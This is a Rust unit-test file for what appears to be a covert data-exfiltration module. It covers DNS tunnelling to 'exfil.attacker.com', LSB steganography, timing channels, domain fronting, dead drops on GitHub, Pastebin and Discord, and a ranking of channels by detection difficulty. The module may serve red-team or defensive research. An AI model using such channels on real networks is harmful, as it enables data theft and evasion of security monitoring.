use super::*;

#[test]
fn channel_type_display() {
    assert_eq!(ChannelType::DnsTunnel.to_string(), "DNS Tunnel");
    assert_eq!(ChannelType::HttpsTunnel.to_string(), "HTTPS Tunnel");
    assert_eq!(ChannelType::Steganography.to_string(), "Steganography");
    assert_eq!(ChannelType::DomainFronting.to_string(), "Domain Fronting");
    assert_eq!(ChannelType::DeadDrop.to_string(), "Dead Drop");
    assert_eq!(ChannelType::TimingChannel.to_string(), "Timing Channel");
}

#[test]
fn detection_difficulty_ordering() {
    assert!(DetectionDifficulty::Low < DetectionDifficulty::Medium);
    assert!(DetectionDifficulty::Medium < DetectionDifficulty::High);
    assert!(DetectionDifficulty::High < DetectionDifficulty::VeryHigh);
}

#[test]
fn dns_tunnel_encode_decode_roundtrip() {
    let data = b"Hello, covert world!";
    let queries = dns_tunnel_encode(data, "exfil.attacker.com", 63);
    assert!(!queries.is_empty());
    for q in &queries {
        assert!(q.ends_with(".exfil.attacker.com"));
    }
    let decoded = dns_tunnel_decode(&queries, "exfil.attacker.com").unwrap();
    assert_eq!(&decoded[..data.len()], data);
}

#[test]
fn dns_tunnel_encode_empty_data() {
    let queries = dns_tunnel_encode(b"", "test.com", 63);
    assert!(queries.is_empty());
}

#[test]
fn dns_tunnel_encode_splits_large_data() {
    let data = vec![0x42u8; 200];
    let queries = dns_tunnel_encode(&data, "t.com", 20);
    assert!(queries.len() > 1);
}

#[test]
fn dns_tunnel_decode_bad_domain() {
    let queries = vec!["0000.data.wrong.com".to_string()];
    let result = dns_tunnel_decode(&queries, "correct.com");
    assert!(result.is_none());
}

#[test]
fn dns_tunnel_config_default() {
    let cfg = DnsTunnelConfig::default();
    assert_eq!(cfg.encoding, DnsEncoding::Base32);
    assert_eq!(cfg.max_label_length, 63);
    assert_eq!(cfg.query_type, DnsQueryType::TXT);
    assert_eq!(cfg.jitter_ms, 500);
}

#[test]
fn lsb_encode_decode_roundtrip() {
    let carrier = vec![0xFFu8; 1024];
    let payload = b"secret message";
    let encoded = lsb_encode(&carrier, payload).unwrap();
    assert_eq!(encoded.len(), carrier.len());
    let decoded = lsb_decode(&encoded).unwrap();
    assert_eq!(&decoded, payload);
}

#[test]
fn lsb_encode_carrier_too_small() {
    let carrier = vec![0u8; 10];
    let payload = b"too large for this carrier";
    assert!(lsb_encode(&carrier, payload).is_none());
}

#[test]
fn lsb_decode_too_short() {
    let data = vec![0u8; 10];
    assert!(lsb_decode(&data).is_none());
}

#[test]
fn timing_channel_encode_decode_roundtrip() {
    let config = TimingChannelConfig::default();
    let data = b"AB";
    let delays = timing_channel_encode(data, &config);
    let sync_len = config.sync_pattern.len();
    assert_eq!(delays.len(), sync_len + 16);

    let decoded = timing_channel_decode(&delays, &config).unwrap();
    assert_eq!(&decoded, data);
}

#[test]
fn timing_channel_encode_sync_prefix() {
    let config = TimingChannelConfig {
        sync_pattern: vec![true, false, true],
        ..TimingChannelConfig::default()
    };
    let delays = timing_channel_encode(b"\x00", &config);
    assert_eq!(delays[0], config.one_delay_ms);
    assert_eq!(delays[1], config.zero_delay_ms);
    assert_eq!(delays[2], config.one_delay_ms);
}

#[test]
fn timing_channel_decode_too_short() {
    let config = TimingChannelConfig::default();
    let delays = vec![50, 150];
    assert!(timing_channel_decode(&delays, &config).is_none());
}

#[test]
fn timing_channel_default_config() {
    let cfg = TimingChannelConfig::default();
    assert_eq!(cfg.bit_duration_ms, 100);
    assert_eq!(cfg.zero_delay_ms, 50);
    assert_eq!(cfg.one_delay_ms, 150);
    assert!(cfg.error_correction);
}

#[test]
fn build_channel_spec_dns_tunnel() {
    let spec = build_channel_spec(ChannelType::DnsTunnel);
    assert_eq!(spec.channel_type, ChannelType::DnsTunnel);
    assert!(spec.capacity_bytes_per_sec > 0.0);
    assert_eq!(spec.detection_difficulty, DetectionDifficulty::Medium);
    assert!(spec.requires_infrastructure);
    assert!(!spec.countermeasures.is_empty());
}

#[test]
fn build_channel_spec_https_tunnel() {
    let spec = build_channel_spec(ChannelType::HttpsTunnel);
    assert_eq!(spec.detection_difficulty, DetectionDifficulty::High);
    assert!(spec.capacity_bytes_per_sec > 1000.0);
}

#[test]
fn build_channel_spec_steganography() {
    let spec = build_channel_spec(ChannelType::Steganography);
    assert_eq!(spec.detection_difficulty, DetectionDifficulty::VeryHigh);
    assert!(!spec.requires_infrastructure);
}

#[test]
fn build_channel_spec_timing_channel() {
    let spec = build_channel_spec(ChannelType::TimingChannel);
    assert_eq!(spec.detection_difficulty, DetectionDifficulty::VeryHigh);
    assert!(spec.capacity_bytes_per_sec < 5.0);
}

#[test]
fn domain_fronting_candidates_not_empty() {
    let candidates = domain_fronting_candidates();
    assert!(candidates.len() >= 2);
    for c in &candidates {
        assert!(!c.front_domain.is_empty());
        assert!(!c.actual_host.is_empty());
    }
}

#[test]
fn dead_drop_service_display() {
    assert_eq!(DeadDropService::GithubIssue.to_string(), "GitHub Issue");
    assert_eq!(DeadDropService::Pastebin.to_string(), "Pastebin");
    assert_eq!(
        DeadDropService::DiscordWebhook.to_string(),
        "Discord Webhook"
    );
}

#[test]
fn rank_channels_returns_all_types() {
    let ranked = rank_channels();
    assert_eq!(ranked.len(), 6);
    for (_, score) in &ranked {
        assert!(*score > 0.0);
        assert!(*score <= 1.0);
    }
    for i in 0..ranked.len() - 1 {
        assert!(ranked[i].1 >= ranked[i + 1].1);
    }
}

#[test]
fn base32_roundtrip_various_inputs() {
    let test_cases: &[&[u8]] = &[
        b"",
        b"a",
        b"ab",
        b"abc",
        b"test data with spaces",
        &[0, 1, 2, 3, 255, 254, 253],
    ];
    for input in test_cases {
        let encoded = base32_encode(input);
        let decoded = base32_decode(&encoded).unwrap();
        assert_eq!(
            &decoded[..input.len()],
            *input,
            "Roundtrip failed for input: {input:?}"
        );
    }
}

#[test]
fn detection_difficulty_display() {
    assert_eq!(DetectionDifficulty::Low.to_string(), "Low");
    assert_eq!(DetectionDifficulty::Medium.to_string(), "Medium");
    assert_eq!(DetectionDifficulty::High.to_string(), "High");
    assert_eq!(DetectionDifficulty::VeryHigh.to_string(), "Very High");
}
